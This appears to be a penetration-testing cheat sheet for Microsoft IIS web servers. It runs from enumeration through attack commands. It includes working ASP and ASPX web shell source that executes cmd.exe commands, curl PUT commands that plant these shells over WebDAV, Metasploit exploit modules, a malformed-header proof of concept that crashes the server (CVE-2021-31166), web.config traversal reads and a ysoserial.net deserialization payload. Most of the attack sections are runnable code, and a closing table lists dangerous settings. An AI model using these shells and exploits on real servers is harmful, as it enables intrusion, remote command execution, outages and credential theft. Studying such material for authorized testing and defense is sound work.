#IIS #InternetInformationServices #Microsoft #webservices #Windows

## What is IIS?
Microsoft Internet Information Services — Windows web server. Ships with Windows Server. Default web server for ASP.NET applications. Serves classic ASP, ASP.NET, and static content. Attack surface includes WebDAV, HTTP method abuse, short name enumeration, and .NET deserialization.

- Port: **TCP 80** — HTTP
- Port: **TCP 443** — HTTPS
- Default web root: `C:\inetpub\wwwroot\`
- Config: `C:\Windows\System32\inetsrv\config\applicationHost.config`
- Web.config per-app: `C:\inetpub\wwwroot\web.config`

---

## Enumeration

```bash
# Nmap
nmap -p 80,443 --script http-title,http-server-header,http-methods,http-webdav-scan -sV <target>

# Fingerprint IIS version
curl -I http://<target>/
whatweb http://<target>

# Check for WebDAV
nmap -p 80 --script http-webdav-scan <target>
curl -X OPTIONS http://<target>/ -v 2>&1 | grep -i "Allow:"

# Short name enumeration (IIS 6.0/7.0/8.0 tilde vulnerability)
# https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 20 8 http://<target>/

# gobuster — .NET extensions
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,config,bak,txt

# Metasploit
use auxiliary/scanner/http/iis_internal_ip   # internal IP via OPTIONS
```

---

## Connect / Access

```bash
curl http://<target>/
curl -k https://<target>/

# Test HTTP methods
curl -X OPTIONS http://<target>/ -v
curl -X PUT http://<target>/test.txt -d "test" -v   # WebDAV
curl -X DELETE http://<target>/test.txt -v
```

---

## Attack Vectors

### WebDAV File Upload → Shell

```bash
# Check WebDAV is enabled
nmap -p 80 --script http-webdav-scan <target>
davtest -url http://<target>/    # test what file types can be uploaded

# Upload shell via WebDAV
curl -X PUT http://<target>/shell.asp -d '<%execute(request("cmd"))%>'
curl -X PUT http://<target>/shell.aspx -d '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami"); %>'

# If PUT returns 201: access shell
curl "http://<target>/shell.asp?cmd=whoami"

# cadaver (WebDAV client)
cadaver http://<target>/
dav:> put shell.asp
dav:> ls

# Metasploit
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <target>
set HttpUsername <user>
set HttpPassword <pass>
run
```

### Short Name Enumeration (Tilde ~1 Trick)

```bash
# IIS 8.0 and earlier leak short (8.3) filenames via 404 vs 400 difference
# e.g., if file is "secretfile.aspx", 8.3 name is "SECRET~1.aspx"
# Attacker can brute enumerate first 6 chars of filenames

# Scanner
java -jar iis_shortname_scanner.jar 20 8 http://<target>/
# Output: reveals partial filenames → guess full names

# Manual check
curl -s -o /dev/null -w "%{http_code}" "http://<target>/s*~1*/a.aspx"
# 404 = prefix doesn't match, 400 = prefix matches (file exists)
```

### ASP/ASPX Web Shell Upload

```bash
# If file upload functionality exists (multipart, FTP, etc.)
# Upload one of:

# Classic ASP shell
echo '<%execute(request("cmd"))%>' > shell.asp

# ASPX shell
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<% System.Diagnostics.Process p = new System.Diagnostics.Process();
   p.StartInfo.FileName = "cmd.exe";
   p.StartInfo.Arguments = "/c " + Request["cmd"];
   p.StartInfo.UseShellExecute = false;
   p.StartInfo.RedirectStandardOutput = true;
   p.Start();
   Response.Write(p.StandardOutput.ReadToEnd()); %>
EOF

# Access shell
curl "http://<target>/shell.aspx?cmd=whoami"
```

### CVE-2017-7269 — IIS 6.0 WebDAV Buffer Overflow

Affects IIS 6.0 (Windows Server 2003). RCE via PROPFIND request.

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS <target>
run
```

### CVE-2021-31166 — HTTP Protocol Stack RCE (IIS 10)

BSOD/RCE via malformed Accept-Encoding header. Windows 10 2004/20H2 + Server 2019.

```bash
# PoC causes BSOD — use carefully in authorized testing
curl -H "Accept-Encoding: ,\"" http://<target>/
```

### web.config Disclosure

```bash
# web.config may contain connection strings, credentials
curl http://<target>/web.config
curl http://<target>/../web.config   # directory traversal

# Common locations
curl http://<target>/Web.config
curl http://<target>/ApplicationSettings.config
```

### .NET Deserialization

```bash
# If application uses BinaryFormatter or other insecure deserializers
# ysoserial.net generates deserialization payloads
# https://github.com/pwntester/ysoserial.net

ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "whoami > C:\inetpub\wwwroot\out.txt" -o base64
# Submit payload in ViewState, cookies, or other deserialized fields
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| WebDAV enabled | File upload → RCE |
| PUT/DELETE methods allowed | Direct file write/delete |
| Old IIS version (< 10) | Multiple CVEs |
| Short name disclosure (tilde) | Filename enumeration |
| web.config accessible | Connection strings, credentials |
| Directory browsing enabled | File listing |
| ASP execution in upload dirs | Uploaded shell execution |

---

## Quick Reference

| Goal | Command |
|---|---|
| Fingerprint | `curl -I http://host` / `whatweb http://host` |
| Check WebDAV | `nmap -p 80 --script http-webdav-scan host` |
| Test methods | `curl -X OPTIONS http://host/ -v` |
| WebDAV shell upload | `curl -X PUT http://host/shell.asp -d '<%execute(request("cmd"))%>'` |
| davtest | `davtest -url http://host/` |
| Short name scan | `java -jar iis_shortname_scanner.jar 20 8 http://host/` |
| Dir brute | `gobuster dir -u http://host -w wordlist.txt -x asp,aspx` |
| MSF WebDAV | `exploit/windows/iis/iis_webdav_upload_asp` |
